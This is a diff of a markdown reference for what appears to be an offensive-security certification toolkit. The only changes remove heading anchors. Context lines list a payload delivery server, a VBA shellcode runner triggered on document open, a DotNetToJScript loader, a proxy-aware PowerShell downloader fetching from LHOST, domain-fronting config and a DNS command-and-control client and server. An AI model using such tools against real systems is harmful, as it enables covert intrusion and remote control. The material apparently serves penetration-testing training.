@@ -44,7 +44,7 @@ python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads   # request log c
 | `m03-dotnettojscript-loader.js` | Bridge reference for an embedded stage 2 | paste the C# payload |
 | `m09-proxy-aware-downloader.ps1` | Downloader for when downloads must go through the system proxy | see scenario 28 |
 
-#### `m00-delivery-server.py` {#m00-delivery-server-py}
+#### `m00-delivery-server.py`
 
 ````python
 #!/usr/bin/env python3
@@ -199,7 +199,7 @@ if __name__ == "__main__":
     sys.exit(main())
 ````
 
-#### `m01-shellcode-runner-vba-archbranch.vba` {#m01-shellcode-runner-vba-archbranch-vba}
+#### `m01-shellcode-runner-vba-archbranch.vba`
 
 ````vb
 ' Purpose: use VBA compile-time constants to auto-match Office bitness, so a Runner with mismatched bitness does not crash the host
@@ -285,7 +285,7 @@ Sub Document_Open()
 End Sub
 ````
 
-#### `m03-dotnettojscript-loader.js` {#m03-dotnettojscript-loader-js}
+#### `m03-dotnettojscript-loader.js`
 
 ````javascript
 /*
@@ -343,7 +343,7 @@ WScript.Echo("[*] the host info above confirms whether the artifact platform (--
 WScript.Quit(0);
 ````
 
-#### `m09-proxy-aware-downloader.ps1` {#m09-proxy-aware-downloader-ps1}
+#### `m09-proxy-aware-downloader.ps1`
 
 ````powershell
 <#
@@ -598,7 +598,7 @@ netsh winhttp show proxy
 | `m00-delivery-server.py` | Stage-2 delivery plus request log | `--port 80 --dir ~/osep/payloads` |
 | `m09-proxy-aware-downloader.ps1` | Stage-2 download when it has to go through a proxy | `-Url http://LHOST/PAYLOAD -Command` |
 
-#### `m09-https-listener.sh` {#m09-https-listener-sh}
+#### `m09-https-listener.sh`
 
 ````bash
 #!/usr/bin/env bash
@@ -954,7 +954,7 @@ exit 0
 | `m09-domain-fronting-nginx.conf` | Front-end template when you need per-domain forwarding or SNI handling | see scenario 33 |
 | `m09-proxy-aware-downloader.ps1` | HTTPS download with a certificate-validation switch | `-Url https://LHOST/PAYLOAD -SkipCertCheck` |
 
-#### `m09-domain-fronting-nginx.conf` {#m09-domain-fronting-nginx-conf}
+#### `m09-domain-fronting-nginx.conf`
 
 ````nginx
 # Purpose: domain fronting front-end config -- the TLS layer uses the front-end domain DOMAIN that the target permits (SNI + certificate),
@@ -1142,7 +1142,7 @@ python3 m09-dns-c2-client.py --server LHOST --port 53 --domain c2.example \
 | `m09-dns-c2-server.py` | DNS C2 server (UDP 53, answers with A records) | `--listen 0.0.0.0 --port 53 --domain c2.example` |
 | `m09-dns-c2-client.py` | DNS C2 client (heartbeat, receive commands, return output) | `--server LHOST --session a1b2c3d4 --interval 2` |
 
-#### `m09-dns-c2-server.py` {#m09-dns-c2-server-py}
+#### `m09-dns-c2-server.py`
 
 ````python
 #!/usr/bin/env python3
@@ -1334,7 +1334,7 @@ if __name__ == "__main__":
     main()
 ````
 
-#### `m09-dns-c2-client.py` {#m09-dns-c2-client-py}
+#### `m09-dns-c2-client.py`
 
 ````python
 #!/usr/bin/env python3
